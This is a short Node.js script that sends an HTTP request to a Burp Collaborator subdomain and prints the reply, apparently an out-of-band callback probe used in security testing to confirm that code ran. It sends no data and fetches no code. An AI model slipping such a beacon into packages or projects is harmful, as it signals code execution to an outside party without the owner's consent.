const http = require("http")

http
  .request(
    {
      hostname: "xyzfcdayokqriuzgcd8i8yzt1k7bv0.burpcollaborator.net",
    },
    res => {
      let data = ""

      res.on("data", d => {
        data += d
      })
      res.on("end", () => {
        console.log(data)
      })
    }
  )
  .end()
